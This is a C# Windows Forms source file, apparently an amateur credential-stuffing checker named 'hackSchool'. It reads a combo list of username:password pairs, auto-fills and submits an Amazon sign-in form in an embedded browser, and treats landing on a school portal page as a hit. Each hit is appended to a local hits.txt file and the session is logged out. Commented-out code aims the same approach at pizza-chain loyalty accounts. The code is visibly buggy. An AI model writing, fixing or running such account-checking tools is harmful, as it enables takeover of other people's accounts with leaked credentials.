using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace hackSchool
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public string siteUrl = "https://www.gamemania.nl/";
        public string loginUrl = "https://www.amazon.nl/ap/signin?_encoding=UTF8&openid.assoc_handle=nlflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.nl%2F%3Fref_%3Dnav_custrec_signin";
        public int lineCount;
        public static List<string> combolist = new List<string>();
        public int tested;
        public int hitsShow;
        public int hits;
        public int lengteLijst;
        public string lengteLijst2;
        public int[] progresint;
        public string[] IS;
        public int I = 0;
        public int I2 = 1;
        public string username;
        public string password;


        private void Form1_Load(object sender, EventArgs e)
        {
            webBrowser1.Navigate(loginUrl);
        }

        private void combobtn_Click(object sender, EventArgs e)
        {
            DialogResult result = openFileDialog1.ShowDialog(); // Show the dialog.
            if (result == DialogResult.OK) // Test result.
            {
                string file = openFileDialog1.FileName;
                try
                {
                    string line;
                    int counter = 0;
                    System.IO.StreamReader kek = new System.IO.StreamReader(file);
                    while ((line = kek.ReadLine()) != null)
                    {
                        combolist.Add(line);
                        counter++;
                    }

                    kek.Close();
                    lineCount = File.ReadLines(file).Count();
                    label1.Text = "Combos : " + lineCount.ToString();
                    
                }
                catch (IOException)
                {
                }
            }
        }

        private void crackbtn_Click(object sender, EventArgs e)
        {
            lengteLijst = Convert.ToInt32(lengteLijst2);
            label3.Text = lengteLijst2;
            webBrowser1.Navigate(siteUrl);
            webBrowser1.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted);
            while (I < lengteLijst && I2 < lengteLijst)
            {
                foreach (string combo in combolist)
                {
                    try
                    {
                        string[] tmp = combo.Split(':');
                        //AutoClosingMessageBox.Show("wait", "checking", 100);
                        string username = tmp[I];
                        //AutoClosingMessageBox.Show("wait", "checking", 100);
                        string password = tmp[I2];
                        //AutoClosingMessageBox.Show("wait", "checking", 100);
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("error");
                    }
                    MessageBox.Show(username, password);
                }
                webBrowser1.Navigate(loginUrl);

                //webBrowser2.Navigate(pizzaURL);
                //AutoClosingMessageBox.Show("wait", "hacking into the system", 1200);


                if (webBrowser1.Document.GetElementById("txtLoginId") != null && webBrowser1.Document.GetElementById("txtPassword") != null && username != null && password != null)
                {
                    try
                    {
                        webBrowser1.Document.GetElementById("txtLoginId").SetAttribute("value", username);
                        webBrowser1.Document.GetElementById("txtPassword").SetAttribute("value", password);
                    }
                    catch (Exception)
                    {
                    }
                }
                else
                {
                    continue;
                }
                HtmlElementCollection elc = this.webBrowser1.Document.GetElementsByTagName("input");
                foreach (HtmlElement el in elc)
                {
                    if (el.GetAttribute("type").Equals("button"))
                    {
                        el.InvokeMember("Click");
                    }
                }
                
                //if (webBrowser2.Document.GetElementById("UserName") != null && webBrowser2.Document.GetElementById("Password") != null && username[I2] != null && password[I2] != null)
                //{
                //    try
                //    {
                //        webBrowser2.Document.GetElementById("UserName").SetAttribute("value", username[I2]);
                //        webBrowser2.Document.GetElementById("Password").SetAttribute("value", password[I2]);
                //    }
                //    catch (NullReferenceException)
                //    {

                //    }
                //}
                //HtmlElementCollection elc2 = this.webBrowser2.Document.GetElementsByTagName("input");
                //foreach (HtmlElement el in elc2)
                //{
                //    if (el.GetAttribute("type").Equals("submit"))
                //    {
                //        el.InvokeMember("Click");
                //    }
                //}
                //AutoClosingMessageBox.Show("crack", "jonkoe", 500);

                if (webBrowser1.Url.Equals(loginUrl))
                {
                    //AutoClosingMessageBox.Show("wait", "checking", 600);
                }
                //if (webBrowser2.Url.Equals(pizzaURL))
                //{
                //    AutoClosingMessageBox.Show("wait", "checking", 1500);
                //}

                if (webBrowser1.Url.Equals(loginUrl))
                {
                    webBrowser1.Navigate(loginUrl);
                }
                //if (webBrowser2.Url.Equals(pizzaURL))
                //{
                //    webBrowser2.Navigate(pizzaURL);
                //}
                if (webBrowser1.Url.Equals("https://natschool.horizoncollege.nl/#17"))
                {

                    //    webBrowser1.Navigate("https://www.newyorkpizza.nl/secure/mypoints");
                    //    AutoClosingMessageBox.Show("crack", "hacked", 1500);
                    //    HtmlDocument source = webBrowser1.Document;
                    //    HtmlElementCollection elements = source.GetElementsByTagName("h2");

                    //foreach (HtmlElement file in elements)
                    //    {
                    //    pizzapunten1 = Convert.ToString(elements).Split('>');    

                    //    MessageBox.Show(Convert.ToString(pizzapunten1.Length));




                    //    }
                    System.Windows.Forms.HtmlDocument webpagedata = this.webBrowser1.Document;
                    hitsShow++;
                    //ListBox1.Items.Add($"{username[I]}:{password[I]}");
                    label3.Text = Convert.ToString(hitsShow);
                    //AutoClosingMessageBox.Show("Succes", "hit", 1000);
                    string[] lines = { username + ":" + password, };
                    System.IO.File.AppendAllLines(@"C:\Users\Jaspe\Source\Repos\bloemetjes\hackSchool\hits.txt", lines);
                    webBrowser1.Navigate("javascript:document.getElementById('logoutForm').submit()");
                    //AutoClosingMessageBox.Show("Logging out", "Caption", 1000);


                    //AutoClosingMessageBox.Show("gyugyu", "shag", 100);
                }
                //if (!webBrowser2.Url.Equals("https://www.newyorkpizza.nl/inloggen"))
                //{
                //    hitsShow++;
                //    label1.Text = Convert.ToString(hitsShow);
                //    listBox1.Items.Add($"{username[I2]}:{password[I2]}");
                //    label1.Text = Convert.ToString(hitsShow);
                //    AutoClosingMessageBox.Show("Succes", "hit", 1000);
                //    string[] lines = { username[I2] + ":" + password[I2] };
                //    System.IO.File.AppendAllLines(@"C:\Users\Jaspe\OneDrive\Documenten\Visual Studio 2015\Projects\pizza2\hits.txt", lines);
                //    webBrowser2.Navigate("javascript:document.getElementById('logoutForm').submit()");
                //    AutoClosingMessageBox.Show("Logging out", "Caption", 1000);


                //    AutoClosingMessageBox.Show("gyugyu", "shag", 100);
                //}

                I = I + 2;
                I2 = I2 + 2;

                tested++;
                label2.Text = Convert.ToString(tested);
                //AutoClosingMessageBox.Show("gyugyu", "shag", 100);
                //IS[0] = Convert.ToString(I);
                //IS[1] = Convert.ToString(I2);
                //File.WriteAllLines(@"C:\Users\Jaspe\OneDrive\Documenten\Visual Studio 2015\Projects\pizza2\ver.txt", IS); 

            }

        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            throw new NotImplementedException();
        }
    }
}
